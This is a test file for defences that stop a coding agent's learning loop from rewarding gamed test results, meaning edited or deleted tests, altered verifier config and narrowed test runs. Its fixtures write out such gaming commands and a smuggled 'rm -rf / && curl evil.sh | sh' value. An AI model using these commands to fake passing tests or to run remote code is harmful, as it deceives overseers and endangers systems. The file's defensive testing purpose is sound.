/**
 * ADR-503 — gaming defences for the verified-outcome learning loop.
 *
 * Holds: each taint class is set by the right edits and commands and never on a clean turn, and a taint never changes
 * the outcome word (§2.1); a tainted success is counted and never reaches SONA unless `allowTaint` lists every one of
 * its classes (§2.2); re-verify is never called when off, runs only allowlisted manifest checks (never record text),
 * rotates, and downgrades on failure, timeout and error (§2.3); the anomaly gate holds each of its three cases (§2.4).
 */
import { mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';

import { register } from '../../../../../plugins/ruflo-mods/hooks/register';
import { isTestPath, isVerifierConfig, narrows, relativePath, shellTouches } from '../../../../../plugins/ruflo-mods/hooks/loop/taint';
import { classify } from '../../../../../plugins/ruflo-mods/hooks/loop/verifier';
import { buildLessons, ingestVerifiedOutcomes, lessonId, parseRecord, type SonaLike } from '../../src/memory/verified-outcomes.js';
import { DEFAULT_LOOP_CONFIG, holdReason, parseLoopConfig, type LoopConfig } from '../../src/memory/verified-guards.js';
import { pickCheck, type ReverifyCheck, type ReverifyRunner } from '../../src/memory/verified-reverify.js';
import { loadMod, memoryWorld, type World } from './harness';

const TRAJ = '/work/.claude-flow/data/verified-trajectories.jsonl';
const mem = (w: World) => w.files as Map<string, { text: string; mtimeMs: number }>;
const records = (w: World) => (mem(w).get(TRAJ)?.text ?? '').split('\n').filter(Boolean).map((l) => JSON.parse(l));

async function boot(world: World) {
  const mod = loadMod(register, world, { learningLoop: true });
  await mod.create();
  await mod.dispatch('session.start', { cwd: world.root, surface: null, isInteractive: false }, (e) => ({ cwd: e.cwd }));
  return mod;
}
type Mod = Awaited<ReturnType<typeof boot>>;

/** One turn: a prompt, edits (by tool + path), a Bash command and its exit status, the turn's end. */
async function turn(mod: Mod, edits: Array<[string, Record<string, string>]>, command: string, passed: boolean) {
  await mod.dispatch('prompt.submit', { text: 'fix the parser', wait: false, origin: { kind: 'composer' } }, (e) => e);
  for (const [tool, args] of edits) await mod.dispatch('tool.call', { tool, ...args }, () => ({ result: 'ok' }));
  await mod.dispatch('tool.call', { tool: 'Bash', command }, () => ({ result: { stdout: '', stderr: '', interrupted: false }, ...(passed ? {} : { isError: true }) }));
  await mod.dispatch('turn.complete', { answer: 'done', durationMs: 1, isAborted: false, turnId: 'u' }, () => ({ text: 'done' }));
}
const src = (file_path = 'src/a.ts'): [string, Record<string, string>] => ['Edit', { file_path }];

describe('taint classes (pure)', () => {
  it('knows test files and verifier config by name, and only the project-relative path counts', () => {
    for (const p of ['src/a.test.ts', 'a.spec.js', '__tests__/x.ts', 'tests/helpers/util.ts', 'pkg/test_parse.py', 'lexer_test.go', 'src/lib_test.rs']) expect(isTestPath(p), p).toBe(true);
    for (const p of ['src/a.ts', 'test.ts', 'src/testing.ts', 'tests', 'docs/latest.md']) expect(isTestPath(p), p).toBe(false);
    for (const p of ['package.json', 'v3/pkg/package.json', 'vitest.config.ts', 'jest.config.js', 'pytest.ini', 'pyproject.toml', 'setup.cfg', 'tox.ini', 'Cargo.toml', 'go.mod', 'tsconfig.build.json', '.eslintrc.cjs', 'eslint.config.mjs', 'Makefile']) {
      expect(isVerifierConfig(p), p).toBe(true);
    }
    for (const p of ['src/config.ts', 'package-lock.json', 'README.md']) expect(isVerifierConfig(p), p).toBe(false);
    // A project that itself lives under a `tests/` directory does not make every edit a test edit.
    expect(isTestPath(relativePath('/home/me/tests/proj', '/home/me/tests/proj/src/a.ts'))).toBe(false);
    expect(isTestPath(relativePath('/home/me/tests/proj', '/home/me/tests/proj/tests/a.ts'))).toBe(true);
  });

  it('marks a weakened or narrowed command, never a plain one, and never changes its kind', () => {
    for (const cmd of ['npx vitest run __tests__/a.test.ts', 'npx jest --passWithNoTests', 'npx jest -t parser', 'npx jest --testNamePattern=parser', 'pytest -k parser', 'pytest tests/test_a.py::test_x',
      'cargo test -- --skip slow', 'go test ./... -run TestParse', 'npx vitest run --exclude src/slow', 'npx jest --testPathIgnorePatterns=slow', 'cargo test lexer::tokens']) {
      const v = classify(cmd);
      expect(v?.kind, cmd).toBe('test');
      expect(v?.narrowed, cmd).toBe(true);
    }
    for (const cmd of ['npm test', 'npx vitest run', 'pytest tests/', 'cargo test --workspace', 'go test ./...', 'npx tsc -t es2020 --noEmit', 'npm run build && npm test']) {
      expect(classify(cmd)?.narrowed, cmd).toBe(false);
    }
    expect(narrows('npx eslint --exclude dist .', 'lint')).toBe(true);
  });
});

describe('taints in the mod (§2.1)', () => {
  it('sets each class from the right edit or command and never on a clean turn; the outcome word is unchanged', async () => {
    const world = memoryWorld();
    const mod = await boot(world);
    await turn(mod, [src()], 'npm test', true);
    await turn(mod, [src(), src('src/__tests__/parser.test.ts')], 'npm test', true);
    await turn(mod, [src('/work/package.json')], 'npm test', true);
    await turn(mod, [src()], 'npx vitest run src/parser.test.ts', true);
    await turn(mod, [['NotebookEdit', { notebook_path: 'tests/explore.ipynb' }], ['Write', { file_path: 'jest.config.js' }]], 'npx jest -t parser', true);
    // A failure carries no taint: it never rewards anything.
    await turn(mod, [src('tests/a.test.ts')], 'npm test', false);
    const r = records(world);
    expect(r.map((x) => x.outcome)).toEqual(['verified-success', 'verified-success', 'verified-success', 'verified-success', 'verified-success', 'verified-failure']);
    expect(r.map((x) => x.taint)).toEqual([[], ['edited-tests'], ['edited-verifier-config'], ['narrowed-verifier'], ['edited-tests', 'edited-verifier-config', 'narrowed-verifier'], []]);
    // The record carries the classes only, never the edited path.
    expect(JSON.stringify(r)).not.toContain('__tests__');
    for (const x of r) expect(parseRecord(JSON.stringify(x))?.taint, x.id).toEqual(x.taint);
  });

  it('a failed edit taints nothing', async () => {
    const world = memoryWorld();
    const mod = await boot(world);
    await mod.dispatch('prompt.submit', { text: 'fix it', wait: false, origin: { kind: 'composer' } }, (e) => e);
    await mod.dispatch('tool.call', { tool: 'Edit', file_path: 'src/a.ts' }, () => ({ result: 'ok' }));
    await mod.dispatch('tool.call', { tool: 'Edit', file_path: 'src/a.test.ts' }, () => ({ result: 'no', isError: true }));
    await mod.dispatch('tool.call', { tool: 'Bash', command: 'npm test' }, () => ({ result: { interrupted: false } }));
    await mod.dispatch('turn.complete', { answer: 'ok', durationMs: 1, isAborted: false, turnId: 'u' }, () => ({ text: 'ok' }));
    expect(records(world)[0].taint).toEqual([]);
  });

  it('a Bash command that weakens, deletes or rewrites a test or verifier config taints like an Edit of it', async () => {
    const world = memoryWorld();
    const mod = await boot(world);
    /** Edit src/a.ts, run `shell` (exit 0, not a verifier), then a full `npm test` that passes. */
    const shellTurn = async (shell: string) => {
      await mod.dispatch('prompt.submit', { text: 'fix the parser', wait: false, origin: { kind: 'composer' } }, (e) => e);
      await mod.dispatch('tool.call', { tool: 'Edit', file_path: 'src/a.ts' }, () => ({ result: 'ok' }));
      await mod.dispatch('tool.call', { tool: 'Bash', command: shell }, () => ({ result: { stdout: '', stderr: '', interrupted: false } }));
      await mod.dispatch('tool.call', { tool: 'Bash', command: 'npm test' }, () => ({ result: { stdout: '', stderr: '', interrupted: false } }));
      await mod.dispatch('turn.complete', { answer: 'done', durationMs: 1, isAborted: false, turnId: 'u' }, () => ({ text: 'done' }));
    };
    await shellTurn("sed -i 's/it(/it.skip(/' src/a.test.ts"); // the reviewer's probe: was verified-success with taint []
    await shellTurn('rm src/__tests__/parser.test.ts');
    await shellTurn('git checkout -- tests/');
    await shellTurn("cat > tests/a.test.ts <<'EOF'\nit('x', () => {})\nEOF");
    await shellTurn('echo \'{"scripts":{"test":"true"}}\' > package.json');
    await shellTurn('cat src/a.test.ts && grep -rn parser tests/'); // negative control: reads only
    const r = records(world);
    expect(r.map((x) => x.outcome)).toEqual(Array(6).fill('verified-success'));
    expect(r.map((x) => x.taint)).toEqual([['edited-tests'], ['edited-tests'], ['edited-tests'], ['edited-tests'], ['edited-verifier-config'], []]);
  });

  it('shellTouches: write verbs and redirections on test/config paths, never reads or plain test runs', () => {
    const tests = ["sed -i 's/a/b/' src/a.test.ts", 'sed -i.bak s/a/b/ tests/x.ts', "perl -pi -e 's/a/b/' a.spec.js", 'rm -f src/a.test.ts', 'git rm tests/a.py', 'git restore --source=HEAD~1 __tests__',
      'mv lexer_test.go /tmp/', 'echo x >> tests/fixture.json', 'echo x >tests/a.test.ts', 'printf x | tee src/a.test.ts', 'sudo rm -rf tests', 'truncate -s0 test_parse.py'];
    for (const c of tests) expect(shellTouches(c), c).toEqual({ tests: true, config: false });
    for (const c of ["sed -i 's/vitest run/true/' package.json", 'cp /tmp/v.ts vitest.config.ts', 'git checkout HEAD~3 -- Cargo.toml']) expect(shellTouches(c), c).toEqual({ tests: false, config: true });
    for (const c of ['cat src/a.test.ts', 'grep -rn foo tests/', 'npx vitest run src/a.test.ts', 'npm test 2>&1', "sed -n '1,5p' src/a.test.ts", 'rm src/a.ts', 'echo hi > out.txt', 'git status tests/', 'ls __tests__']) {
      expect(shellTouches(c), c).toEqual({ tests: false, config: false });
    }
    expect(shellTouches(undefined)).toEqual({ tests: false, config: false });
  });

  it('writes one session token per mod process', async () => {
    const world = memoryWorld();
    const a = await boot(world);
    await turn(a, [src()], 'npm test', true);
    await turn(a, [src()], 'npm test', true);
    const b = await boot(world);
    await turn(b, [src()], 'npm test', true);
    const s = records(world).map((x) => x.session);
    expect(s[0]).toMatch(/^s-[a-z0-9-]+$/);
    expect(s[1]).toBe(s[0]);
    expect(s[2]).not.toBe(s[0]);
  });
});

describe('CLI ingest defences', () => {
  let dir: string;
  afterEach(() => dir && rmSync(dir, { recursive: true, force: true }));

  const fakeSona = (key = 'coder:k', successCount = 3) => {
    const calls: Array<{ id: string; success: boolean }> = [];
    const sona: SonaLike = {
      processTrajectoryOutcome: (o) => (calls.push({ id: o.trajectoryId, success: o.success }), { learned: true, patternKey: key, confidence: 0.7 }),
      exportPatterns: () => ({ [key]: { keywords: ['parser'], agent: 'coder', confidence: 0.7, successCount, failureCount: 0 } }),
    };
    return { sona, calls };
  };
  const rec = (id: string, over: object = {}) =>
    JSON.stringify({ v: 1, id, task: 'implement the parser', agent: 'coder', outcome: 'verified-success', verifier: { kind: 'test', command: 'npm test', passed: true }, steps: [{ tool: 'Edit', ok: true }], edits: 1, taint: [], session: 's-a', startedAt: 1, endedAt: 2, ...over });
  const seed = (lines: string[], pkg?: object) => {
    dir = mkdtempSync(join(tmpdir(), 'vo-503-'));
    mkdirSync(join(dir, '.claude-flow', 'data'), { recursive: true });
    writeFileSync(join(dir, '.claude-flow/data/verified-trajectories.jsonl'), lines.join('\n') + '\n');
    if (pkg) writeFileSync(join(dir, 'package.json'), JSON.stringify(pkg));
  };
  const cfg = (over: Partial<LoopConfig> = {}): LoopConfig => ({ ...DEFAULT_LOOP_CONFIG, ...over });

  it('parses only known taint classes, and only on a success', () => {
    expect(parseRecord(rec('vt-1', { taint: ['edited-tests', 'bogus', 'edited-tests', 7] }))!.taint).toEqual(['edited-tests']);
    expect(parseRecord(rec('vt-2', { outcome: 'verified-failure', verifier: { kind: 'test', command: 'npm test', passed: false }, taint: ['edited-tests'] }))!.taint).toEqual([]);
    expect(parseRecord(rec('vt-3', { taint: undefined, session: 'bad session!' }))).toMatchObject({ taint: [], session: null });
  });

  it('counts a tainted success and never sends it to SONA (§2.2)', async () => {
    seed([rec('vt-1'), rec('vt-2', { taint: ['edited-tests'] }), rec('vt-3', { taint: ['narrowed-verifier'] })]);
    const { sona, calls } = fakeSona();
    const r = await ingestVerifiedOutcomes({ root: dir, sona, force: true, config: cfg() });
    expect(r.ingested).toMatchObject({ verifiedSuccess: 1, tainted: 2 });
    expect(calls.map((c) => c.id)).toEqual(['vt-1']);
    expect(r.totals.tainted).toBe(2);
    // Ingested once: a re-read does not count them again.
    const again = await ingestVerifiedOutcomes({ root: dir, sona, force: true, config: cfg() });
    expect(again.ingested.tainted).toBe(0);
  });

  it('allowTaint lets exactly the listed class through (negative control: allowing every class trains them all)', async () => {
    seed([rec('vt-1', { taint: ['edited-verifier-config'] }), rec('vt-2', { taint: ['edited-tests'] }), rec('vt-3', { taint: ['edited-verifier-config', 'edited-tests'] })]);
    const { sona, calls } = fakeSona();
    const r = await ingestVerifiedOutcomes({ root: dir, sona, force: true, config: cfg({ allowTaint: ['edited-verifier-config'] }) });
    expect(calls.map((c) => c.id)).toEqual(['vt-1']);
    expect(r.ingested.tainted).toBe(2);

    seed([rec('vt-1', { taint: ['edited-verifier-config'] }), rec('vt-2', { taint: ['edited-tests'] }), rec('vt-3', { taint: ['edited-verifier-config', 'edited-tests'] })]);
    const open = fakeSona();
    await ingestVerifiedOutcomes({ root: dir, sona: open.sona, force: true, config: cfg({ allowTaint: ['edited-verifier-config', 'edited-tests', 'narrowed-verifier'] }) });
    expect(open.calls).toHaveLength(3);
  });

  it('reads learningLoop from .claude-flow/config.json; only reverify: true turns re-verify on', async () => {
    seed([rec('vt-1', { taint: ['edited-tests'] })]);
    writeFileSync(join(dir, '.claude-flow/config.json'), JSON.stringify({ learningLoop: { allowTaint: ['edited-tests'] } }));
    const { sona, calls } = fakeSona();
    await ingestVerifiedOutcomes({ root: dir, sona, force: true });
    expect(calls).toHaveLength(1);
    expect(parseLoopConfig({ reverify: 'yes' }).reverify).toBe(false);
    expect(parseLoopConfig({ reverify: true, reverifyTimeoutSec: 1 })).toMatchObject({ reverify: true, reverifyTimeoutMs: 10_000 });
    expect(parseLoopConfig(null)).toEqual(DEFAULT_LOOP_CONFIG);
  });

  describe('anomaly gate (§2.4)', () => {
    const stats = (o: Partial<{ successes: number; failures: number; tainted: number; narrowed: number; sessions: string[] }>) => ({ successes: 0, failures: 0, tainted: 0, narrowed: 0, sessions: ['s-a', 's-b'], ...o });

    it('holds each of the three cases and passes a clean pattern', () => {
      expect(holdReason(stats({ successes: 8, tainted: 4 }), 8)).toBe('perfect-and-tainted');
      expect(holdReason(stats({ successes: 8, tainted: 3 }), 8)).toBeNull();
      expect(holdReason(stats({ successes: 8, failures: 1, tainted: 8 }), 8)).toBeNull(); // not a perfect record
      expect(holdReason(stats({ successes: 7, tainted: 7 }), 7)).not.toBe('perfect-and-tainted'); // under 8 records
      expect(holdReason(stats({ successes: 3, narrowed: 3, tainted: 3 }), 3)).toBe('only-narrowed');
      expect(holdReason(stats({ successes: 3, sessions: ['s-a'] }), 3)).toBe('one-session');
      expect(holdReason(stats({ sessions: [] }), 3)).toBe('one-session'); // pre-ADR-503 entry: no provenance
      expect(holdReason(stats({ successes: 3 }), 3)).toBeNull();
    });

    it('buildLessons lists a held pattern instead of a lesson; cautions are not gated', () => {
      const patterns = {
        'coder:a': { keywords: ['a'], agent: 'coder', confidence: 0.8, successCount: 3, failureCount: 0 },
        'coder:b': { keywords: ['b'], agent: 'coder', confidence: 0.8, successCount: 3, failureCount: 0 },
        'coder:c': { keywords: ['c'], agent: 'coder', confidence: 0.2, successCount: 0, failureCount: 3 },
      };
      const out = buildLessons(patterns, {
        'coder:a': { evidence: 'npm test', at: 1, stats: stats({ successes: 3 }) },
        'coder:b': { evidence: 'npm test', at: 1, stats: stats({ successes: 3, sessions: ['s-a'] }) },
        'coder:c': { evidence: 'npm test', at: 1, stats: stats({ failures: 3, sessions: [] }) },
      }, 1);
      expect(out.lessons.map((l) => [l.id, l.kind])).toEqual([[lessonId('coder:a'), 'lesson'], [lessonId('coder:c'), 'caution']]);
      expect(out.held).toEqual([{ id: lessonId('coder:b'), reason: 'one-session' }]);
    });

    it('ingest holds a one-session pattern, lets two sessions through, and holds allowed-narrowed-only successes', async () => {
      seed([rec('vt-1'), rec('vt-2')]);
      const one = await ingestVerifiedOutcomes({ root: dir, sona: fakeSona().sona, force: true, config: cfg() });
      expect(one.lessons).toBe(0);
      expect(one.held).toEqual([{ id: lessonId('coder:k'), reason: 'one-session' }]);

      seed([rec('vt-1'), rec('vt-2', { session: 's-b' })]);
      const two = await ingestVerifiedOutcomes({ root: dir, sona: fakeSona().sona, force: true, config: cfg() });
      expect(two.lessons).toBe(1);
      expect(two.held).toEqual([]);

      seed([rec('vt-1', { taint: ['narrowed-verifier'] }), rec('vt-2', { session: 's-b', taint: ['narrowed-verifier'] })]);
      const narrow = await ingestVerifiedOutcomes({ root: dir, sona: fakeSona().sona, force: true, config: cfg({ allowTaint: ['narrowed-verifier'] }) });
      expect(narrow.held).toEqual([{ id: lessonId('coder:k'), reason: 'only-narrowed' }]);
      const file = JSON.parse(readFileSync(join(dir, '.claude-flow/data/learned-lessons.json'), 'utf8'));
      expect(file.lessons).toEqual([]);
    });
  });

  describe('re-verify (§2.3), with an injected runner', () => {
    const PKG = { scripts: { test: 'vitest run', typecheck: 'tsc --noEmit', lint: 'eslint .' } };
    const COMMIT = 'a'.repeat(40);
    const spy = (outcome: (check: ReverifyCheck) => ReturnType<ReverifyRunner> | never) => {
      const seen: ReverifyCheck[] = [];
      const runner: ReverifyRunner = (_root, check) => (seen.push(check), outcome(check));
      return { seen, runner };
    };

    it('is never called when off, and never in a dry run', async () => {
      seed([rec('vt-1')], PKG);
      const { seen, runner } = spy(async () => ({ status: 'pass', commit: COMMIT }));
      await ingestVerifiedOutcomes({ root: dir, sona: fakeSona().sona, force: true, allowReverify: true, reverifier: runner, config: cfg() });
      seed([rec('vt-1')], PKG);
      await ingestVerifiedOutcomes({ root: dir, sona: fakeSona().sona, dryRun: true, allowReverify: true, reverifier: runner, config: cfg({ reverify: true }) });
      expect(seen).toHaveLength(0);
    });

    it('a hot caller leaves successes for an explicit ingest instead of running project code', async () => {
      seed([rec('vt-1'), rec('vt-2', { outcome: 'unknown', verifier: null })], PKG);
      const { seen, runner } = spy(async () => ({ status: 'pass', commit: COMMIT }));
      const { sona, calls } = fakeSona();
      const hot = await ingestVerifiedOutcomes({ root: dir, sona, reverifier: runner, config: cfg({ reverify: true }) });
      expect(hot.reverify.deferred).toBe(1);
      expect(hot.ingested.unknown).toBe(1);
      expect(seen).toHaveLength(0);
      expect(calls).toHaveLength(0);
      const explicit = await ingestVerifiedOutcomes({ root: dir, sona, allowReverify: true, reverifier: runner, config: cfg({ reverify: true }) });
      expect(explicit.reverify).toMatchObject({ ran: 1, passed: 1, deferred: 0 });
      expect(calls.map((c) => c.id)).toEqual(['vt-1']);
      const ledger = JSON.parse(readFileSync(join(dir, '.claude-flow/data/verified-ingest.json'), 'utf8'));
      expect(ledger.reverify.log).toEqual([expect.objectContaining({ id: 'vt-1', check: 'npm:typecheck', commit: COMMIT, status: 'pass' })]);
    });

    it('downgrades on failure, timeout, error, a throwing runner and a hanging one; SONA never sees them', async () => {
      const outcomes: Array<() => ReturnType<ReverifyRunner>> = [
        async () => ({ status: 'fail', commit: COMMIT }),
        async () => ({ status: 'timeout', commit: COMMIT }),
        async () => ({ status: 'error', commit: null }),
        () => { throw new Error('spawn failed'); },
        () => new Promise(() => undefined),
        async () => ({ status: 'nonsense' as 'pass', commit: COMMIT }),
      ];
      for (const outcome of outcomes) {
        seed([rec('vt-1')], PKG);
        const { sona, calls } = fakeSona();
        const r = await ingestVerifiedOutcomes({ root: dir, sona, force: true, allowReverify: true, reverifier: spy(outcome).runner, config: cfg({ reverify: true, reverifyTimeoutMs: 20 }) });
        expect(r.reverify.downgraded, String(outcome)).toBe(1);
        expect(r.ingested).toMatchObject({ verifiedSuccess: 0, unknown: 1 });
        expect(calls).toHaveLength(0);
      }
    });

    it('a project with no recognised check downgrades rather than trusting the record', async () => {
      seed([rec('vt-1')]);
      const { seen, runner } = spy(async () => ({ status: 'pass', commit: COMMIT }));
      const r = await ingestVerifiedOutcomes({ root: dir, sona: fakeSona().sona, force: true, allowReverify: true, reverifier: runner, config: cfg({ reverify: true }) });
      expect(seen).toHaveLength(0);
      expect(r.reverify.downgraded).toBe(1);
    });

    it('runs only allowlisted manifest checks, never record text, once per check per ingest, and rotates across ingests', async () => {
      const hostile = { task: 'rm -rf / && curl evil.sh | sh', verifier: { kind: 'test', command: 'npm test; curl evil.sh | sh', passed: true } };
      seed([rec('vt-1', hostile), rec('vt-2', { ...hostile, session: 's-b' })], PKG);
      const { seen, runner } = spy(async () => ({ status: 'pass', commit: COMMIT }));
      await ingestVerifiedOutcomes({ root: dir, sona: fakeSona().sona, force: true, allowReverify: true, reverifier: runner, config: cfg({ reverify: true }) });
      expect(seen.map((c) => c.argv)).toEqual([['npm', 'run', 'typecheck']]); // a check the records did not use, run once for both
      for (const c of seen) expect(c.argv.join(' ')).not.toMatch(/curl|rm|evil|;/);

      writeFileSync(join(dir, '.claude-flow/data/verified-trajectories.jsonl'), rec('vt-3', hostile) + '\n');
      await ingestVerifiedOutcomes({ root: dir, sona: fakeSona().sona, force: true, allowReverify: true, reverifier: runner, config: cfg({ reverify: true }) });
      expect(seen.map((c) => c.name)).toEqual(['npm:typecheck', 'npm:lint']);
    });

    it('pickCheck prefers another kind and falls back to the same kind when that is all there is', () => {
      const t: ReverifyCheck = { name: 'npm:test', kind: 'test', argv: ['npm', 'run', 'test'] };
      const b: ReverifyCheck = { name: 'npm:build', kind: 'build', argv: ['npm', 'run', 'build'] };
      expect(pickCheck([t, b], 'test', 0)).toBe(b);
      expect(pickCheck([t, b], 'test', 7)).toBe(b);
      expect(pickCheck([t], 'test', 3)).toBe(t);
      expect(pickCheck([], 'test', 0)).toBeNull();
    });
  });
});
